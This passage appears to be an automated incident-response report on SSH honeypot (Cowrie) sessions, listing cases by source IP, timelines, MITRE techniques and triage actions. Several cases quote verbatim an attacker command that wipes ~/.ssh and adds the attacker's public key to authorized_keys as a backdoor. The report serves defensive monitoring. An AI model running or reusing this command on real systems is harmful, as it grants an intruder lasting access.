- [ ] Block `166.62.41[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c623fd400675

| Field | Detail |
|---|---|
| **Source IP** | `51.254.130[.]161` |
| **First Seen** | 2026-10-20 01:50 |
| **Last Seen** | 2026-10-20 01:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:50:50` | `cowrie.session.connect` |
| `2026-10-20 01:50:50` | `cowrie.client.version` |
| `2026-10-20 01:50:50` | `cowrie.client.kex` |
| `2026-10-20 01:50:50` | `cowrie.login.success` |
| `2026-10-20 01:50:51` | `cowrie.session.params` |
| `2026-10-20 01:50:51` | `cowrie.command.input` |
| `2026-10-20 01:50:51` | `cowrie.command.failed` |
| `2026-10-20 01:50:51` | `cowrie.log.closed` |
| `2026-10-20 01:50:52` | `cowrie.session.params` |
| `2026-10-20 01:50:52` | `cowrie.command.input` |
| `2026-10-20 01:50:52` | `cowrie.session.file_download` |
| `2026-10-20 01:50:52` | `cowrie.log.closed` |
| `2026-10-20 01:50:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.254.130[.]161` to AbuseIPDB if not already reported
- [ ] Block `51.254.130[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d4eb1f8d1fb

| Field | Detail |
|---|---|
| **Source IP** | `51.254.130[.]161` |
| **First Seen** | 2026-10-20 01:50 |
| **Last Seen** | 2026-10-20 01:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:50:52` | `cowrie.session.connect` |
| `2026-10-20 01:50:52` | `cowrie.client.version` |
| `2026-10-20 01:50:52` | `cowrie.client.kex` |
| `2026-10-20 01:50:52` | `cowrie.login.success` |
| `2026-10-20 01:50:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.254.130[.]161` to AbuseIPDB if not already reported
- [ ] Block `51.254.130[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bbedea0de25

| Field | Detail |
|---|---|
| **Source IP** | `154.83.16[.]14` |
| **First Seen** | 2026-10-20 01:51 |
| **Last Seen** | 2026-10-20 01:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:51:18` | `cowrie.session.connect` |
| `2026-10-20 01:51:18` | `cowrie.client.version` |
| `2026-10-20 01:51:18` | `cowrie.client.kex` |
| `2026-10-20 01:51:19` | `cowrie.login.success` |
| `2026-10-20 01:51:20` | `cowrie.session.params` |
| `2026-10-20 01:51:20` | `cowrie.command.input` |
| `2026-10-20 01:51:20` | `cowrie.command.failed` |
| `2026-10-20 01:51:20` | `cowrie.log.closed` |
| `2026-10-20 01:51:21` | `cowrie.session.params` |
| `2026-10-20 01:51:21` | `cowrie.command.input` |
| `2026-10-20 01:51:21` | `cowrie.session.file_download` |
| `2026-10-20 01:51:21` | `cowrie.log.closed` |
| `2026-10-20 01:51:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.16[.]14` to AbuseIPDB if not already reported
- [ ] Block `154.83.16[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa10a3e69b12

| Field | Detail |
|---|---|
| **Source IP** | `154.83.16[.]14` |
| **First Seen** | 2026-10-20 01:51 |
| **Last Seen** | 2026-10-20 01:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:51:21` | `cowrie.session.connect` |
| `2026-10-20 01:51:21` | `cowrie.client.version` |
| `2026-10-20 01:51:22` | `cowrie.client.kex` |
| `2026-10-20 01:51:22` | `cowrie.login.success` |
| `2026-10-20 01:51:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.83.16[.]14` to AbuseIPDB if not already reported
- [ ] Block `154.83.16[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a2b45536d4f

| Field | Detail |
|---|---|
| **Source IP** | `137.184.179[.]158` |
| **First Seen** | 2026-10-20 01:52 |
| **Last Seen** | 2026-10-20 01:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:52:10` | `cowrie.session.connect` |
| `2026-10-20 01:52:10` | `cowrie.client.version` |
| `2026-10-20 01:52:11` | `cowrie.client.kex` |
| `2026-10-20 01:52:11` | `cowrie.login.success` |
| `2026-10-20 01:52:11` | `cowrie.session.params` |
| `2026-10-20 01:52:11` | `cowrie.command.input` |
| `2026-10-20 01:52:11` | `cowrie.command.failed` |
| `2026-10-20 01:52:12` | `cowrie.log.closed` |
| `2026-10-20 01:52:13` | `cowrie.session.params` |
| `2026-10-20 01:52:13` | `cowrie.command.input` |
| `2026-10-20 01:52:13` | `cowrie.session.file_download` |
| `2026-10-20 01:52:13` | `cowrie.log.closed` |
| `2026-10-20 01:52:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.184.179[.]158` to AbuseIPDB if not already reported
- [ ] Block `137.184.179[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b67208788ec8

| Field | Detail |
|---|---|
| **Source IP** | `137.184.179[.]158` |
| **First Seen** | 2026-10-20 01:52 |
| **Last Seen** | 2026-10-20 01:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:52:13` | `cowrie.session.connect` |
| `2026-10-20 01:52:13` | `cowrie.client.version` |
| `2026-10-20 01:52:13` | `cowrie.client.kex` |
| `2026-10-20 01:52:13` | `cowrie.login.success` |
| `2026-10-20 01:52:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `137.184.179[.]158` to AbuseIPDB if not already reported
- [ ] Block `137.184.179[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4efc67f659c1

| Field | Detail |
|---|---|
| **Source IP** | `202.145.0[.]61` |
| **First Seen** | 2026-10-20 01:53 |
| **Last Seen** | 2026-10-20 01:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:53:16` | `cowrie.session.connect` |
| `2026-10-20 01:53:16` | `cowrie.client.version` |
| `2026-10-20 01:53:16` | `cowrie.client.kex` |
| `2026-10-20 01:53:17` | `cowrie.login.success` |
| `2026-10-20 01:53:18` | `cowrie.session.params` |
| `2026-10-20 01:53:18` | `cowrie.command.input` |
| `2026-10-20 01:53:18` | `cowrie.command.failed` |
| `2026-10-20 01:53:19` | `cowrie.log.closed` |
| `2026-10-20 01:53:19` | `cowrie.session.params` |
| `2026-10-20 01:53:19` | `cowrie.command.input` |
| `2026-10-20 01:53:20` | `cowrie.session.file_download` |
| `2026-10-20 01:53:20` | `cowrie.log.closed` |
| `2026-10-20 01:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.145.0[.]61` to AbuseIPDB if not already reported
- [ ] Block `202.145.0[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1cf26981c9d

| Field | Detail |
|---|---|
| **Source IP** | `202.145.0[.]61` |
| **First Seen** | 2026-10-20 01:53 |
| **Last Seen** | 2026-10-20 01:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:53:20` | `cowrie.session.connect` |
| `2026-10-20 01:53:20` | `cowrie.client.version` |
| `2026-10-20 01:53:20` | `cowrie.client.kex` |
| `2026-10-20 01:53:21` | `cowrie.login.success` |
| `2026-10-20 01:53:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.145.0[.]61` to AbuseIPDB if not already reported
- [ ] Block `202.145.0[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b788108b6d30

| Field | Detail |
|---|---|
| **Source IP** | `58.229.253[.]119` |
| **First Seen** | 2026-10-20 01:53 |
| **Last Seen** | 2026-10-20 01:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:53:39` | `cowrie.session.connect` |
| `2026-10-20 01:53:39` | `cowrie.client.version` |
| `2026-10-20 01:53:39` | `cowrie.client.kex` |
| `2026-10-20 01:53:40` | `cowrie.login.success` |
| `2026-10-20 01:53:41` | `cowrie.session.params` |
| `2026-10-20 01:53:41` | `cowrie.command.input` |
| `2026-10-20 01:53:41` | `cowrie.command.failed` |
| `2026-10-20 01:53:41` | `cowrie.log.closed` |
| `2026-10-20 01:53:42` | `cowrie.session.params` |
| `2026-10-20 01:53:42` | `cowrie.command.input` |
| `2026-10-20 01:53:42` | `cowrie.session.file_download` |
| `2026-10-20 01:53:42` | `cowrie.log.closed` |
| `2026-10-20 01:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.253[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.229.253[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f72d4db49c77

| Field | Detail |
|---|---|
| **Source IP** | `58.229.253[.]119` |
| **First Seen** | 2026-10-20 01:53 |
| **Last Seen** | 2026-10-20 01:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 01:53:42` | `cowrie.session.connect` |
| `2026-10-20 01:53:42` | `cowrie.client.version` |
| `2026-10-20 01:53:43` | `cowrie.client.kex` |
| `2026-10-20 01:53:43` | `cowrie.login.success` |
| `2026-10-20 01:53:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.253[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.229.253[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00c3f383a279

| Field | Detail |
|---|---|
| **Source IP** | `103.211.76[.]8` |
| **First Seen** | 2026-10-20 02:00 |
| **Last Seen** | 2026-10-20 02:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 02:00:34` | `cowrie.session.connect` |
| `2026-10-20 02:00:34` | `cowrie.client.version` |
| `2026-10-20 02:00:34` | `cowrie.client.kex` |
| `2026-10-20 02:00:35` | `cowrie.login.success` |
| `2026-10-20 02:00:36` | `cowrie.session.params` |
| `2026-10-20 02:00:36` | `cowrie.command.input` |
| `2026-10-20 02:00:36` | `cowrie.log.closed` |
| `2026-10-20 02:00:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.211.76[.]8` to AbuseIPDB if not already reported
- [ ] Block `103.211.76[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e624378a1c6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-10-20 02:04 |
| **Last Seen** | 2026-10-20 02:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-20 02:04:47` | `cowrie.session.connect` |
| `2026-10-20 02:04:47` | `cowrie.client.version` |
| `2026-10-20 02:04:47` | `cowrie.client.kex` |
| `2026-10-20 02:04:48` | `cowrie.login.success` |
| `2026-10-20 02:04:48` | `cowrie.direct-tcpip.request` |
| `2026-10-20 02:04:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-10-20 02:04:49` | `cowrie.direct-tcpip.data` |
| `2026-10-20 02:04:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (144) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-b4bbe523810c | HIGH | `176.53.159[.]196` | 2026-10-20 02:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5513444ce898 | HIGH | `120.48.57[.]133` | 2026-10-20 02:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0032fc0e2fde | HIGH | `120.48.57[.]133` | 2026-10-20 02:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-aef93cb11b60 | HIGH | `41.242.115[.]83` | 2026-10-20 02:41 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-962e0a729b3d | HIGH | `134.175.73[.]154` | 2026-10-20 02:41 | Y | 1 | 0 | `T1021.004 · T1078 · T1592` |
| IR-ba750e856298 | HIGH | `41.242.115[.]83` | 2026-10-20 02:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8284b2079a9a | HIGH | `45.156.131[.]23` | 2026-10-20 02:43 | Y | 3 | 0 | `T1078` |
| IR-32789657e742 | HIGH | `34.156.246[.]29` | 2026-10-20 02:57 | Y | 2 | 0 | `T1078` |
| IR-0fae3d72a326 | HIGH | `34.156.246[.]29` | 2026-10-20 02:57 | Y | 1 | 0 | `T1078` |
| IR-a24391d0bc3c | HIGH | `34.156.246[.]29` | 2026-10-20 02:57 | Y | 0 | 0 | `T1078` |
| IR-8345f953a488 | HIGH | `4.150.201[.]26` | 2026-10-20 03:05 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4a14765b92fa | HIGH | `4.150.201[.]26` | 2026-10-20 03:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fe2dc73ac3ac | HIGH | `47.148.181[.]190` | 2026-10-20 03:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-88f08d6925cd | HIGH | `47.148.181[.]190` | 2026-10-20 03:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fb81fd2815f1 | HIGH | `194.226.126[.]212` | 2026-10-20 03:11 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-7c9571228252 | HIGH | `194.226.126[.]212` | 2026-10-20 03:11 | Y | 0 | 0 | `T1078 · T1592` |
| IR-cc64ee2ce09e | HIGH | `92.118.39[.]14` | 2026-10-20 03:11 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-3a6af8c6a034 | HIGH | `34.156.111[.]81` | 2026-10-20 03:22 | Y | 2 | 0 | `T1078` |
| IR-a5e3792b4da6 | HIGH | `34.156.111[.]81` | 2026-10-20 03:22 | Y | 1 | 0 | `T1078` |
| IR-0b1c89113bd5 | HIGH | `34.156.111[.]81` | 2026-10-20 03:22 | Y | 0 | 0 | `T1078` |
| IR-d4ea924c8747 | HIGH | `85.198.19[.]242` | 2026-10-20 03:35 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-74e3819c72cf | HIGH | `85.198.19[.]242` | 2026-10-20 03:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fa07783eb4d1 | HIGH | `202.165.22[.]173` | 2026-10-20 03:38 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-236c0c6ce39a | HIGH | `202.165.22[.]173` | 2026-10-20 03:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9612ca8eee9a | HIGH | `211.106.133[.]202` | 2026-10-20 03:38 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-fd97632f7f77 | HIGH | `211.106.133[.]202` | 2026-10-20 03:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8488a90b47ea | HIGH | `23.94.102[.]136` | 2026-10-20 03:39 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1814550903f6 | HIGH | `23.94.102[.]136` | 2026-10-20 03:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4d4c7d08034e | HIGH | `193.112.192[.]91` | 2026-10-20 03:44 | Y | 1 | 0 | `T1078 · T1592` |
| IR-5fa0113b2dc2 | HIGH | `193.112.192[.]91` | 2026-10-20 03:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4e7164aead28 | HIGH | `169.58.111[.]93` | 2026-10-20 03:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f20a4f139acb | HIGH | `130.12.180[.]51` | 2026-10-20 03:49 | Y | 1 | 2 | `T1021.004 · T1059.004 · T1078` |
| IR-ce458bdb4e72 | HIGH | `101.96.206[.]202` | 2026-10-20 03:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-858ab2d25cac | HIGH | `103.211.76[.]8` | 2026-10-20 04:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-2c9aecffcd3f | HIGH | `34.79.144[.]214` | 2026-10-20 04:01 | Y | 2 | 0 | `T1078` |
| IR-c7245616f2d0 | HIGH | `34.79.144[.]214` | 2026-10-20 04:01 | Y | 1 | 0 | `T1078` |
| IR-ecfb9dbd078d | HIGH | `34.79.144[.]214` | 2026-10-20 04:01 | Y | 0 | 0 | `T1078` |
| IR-a7b51d57a868 | HIGH | `217.60.255[.]130` | 2026-10-20 04:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-acfae3563fe8 | HIGH | `92.118.39[.]71` | 2026-10-20 04:07 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-84386c195984 | HIGH | `2.57.122[.]238` | 2026-10-20 04:11 | Y | 1 | 0 | `T1078 · T1592` |
| IR-4fb112b74f4c | HIGH | `34.156.128[.]161` | 2026-10-20 04:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1c35914db637 | HIGH | `176.53.159[.]196` | 2026-10-20 04:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bafd3342e00c | HIGH | `106.12.74[.]119` | 2026-10-20 05:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bd7413586f1e | HIGH | `106.12.74[.]119` | 2026-10-20 05:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-63b93ddd3bea | HIGH | `124.222.128[.]208` | 2026-10-20 05:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9c9cc46e727a | HIGH | `103.143.239[.]201` | 2026-10-20 05:06 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6ae3c523c1af | HIGH | `200.219.200[.]16` | 2026-10-20 05:06 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c41bdd730341 | HIGH | `103.143.239[.]201` | 2026-10-20 05:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1e9b3af0c888 | HIGH | `200.219.200[.]16` | 2026-10-20 05:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-df8559eddb00 | HIGH | `122.180.242[.]27` | 2026-10-20 05:07 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-bb1703332317 | HIGH | `122.180.242[.]27` | 2026-10-20 05:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-140fc50733ec | HIGH | `192.3.90[.]251` | 2026-10-20 05:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-70905ccd922f | HIGH | `192.3.90[.]251` | 2026-10-20 05:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-445fedd41dc0 | HIGH | `42.51.33[.]162` | 2026-10-20 05:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9cd879dc7702 | HIGH | `42.51.33[.]162` | 2026-10-20 05:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b69dfc21678f | HIGH | `113.161.79[.]218` | 2026-10-20 05:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b0e3be8ae4bb | HIGH | `113.161.79[.]218` | 2026-10-20 05:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-19c9d61aa607 | HIGH | `36.92.140[.]209` | 2026-10-20 05:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-c2adb316eaf1 | HIGH | `36.92.140[.]209` | 2026-10-20 05:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c310eea4bc8a | HIGH | `92.118.39[.]71` | 2026-10-20 06:00 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-52b5c249c8fd | HIGH | `103.211.76[.]8` | 2026-10-20 06:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-631d88fd8a9d | HIGH | `217.60.255[.]130` | 2026-10-20 06:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-af52fd5792b7 | HIGH | `69.6.222[.]101` | 2026-10-20 06:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-52e7130fe177 | HIGH | `69.6.222[.]101` | 2026-10-20 06:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-6e4406ad0b38 | HIGH | `176.53.159[.]196` | 2026-10-20 06:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-116f94ec377a | HIGH | `101.126.67[.]70` | 2026-10-20 06:58 | Y | 19 | 2 | `T1021.004 · T1053.003 · T1057` |
| IR-b968198a635a | HIGH | `103.211.76[.]8` | 2026-10-20 08:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-4ee3b5f3f69f | HIGH | `96.126.117[.]80` | 2026-10-20 08:02 | Y | 0 | 0 | `T1078` |
| IR-432046bcbc36 | HIGH | `96.126.117[.]80` | 2026-10-20 08:04 | Y | 8 | 0 | `T1078` |
| IR-1685f6e36849 | HIGH | `217.60.255[.]130` | 2026-10-20 08:05 | Y | 0 | 0 | `T1078 · T1592` |
| IR-391338058ac5 | HIGH | `176.53.159[.]196` | 2026-10-20 08:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f661bb9280bc | HIGH | `82.64.79[.]135` | 2026-10-20 08:12 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
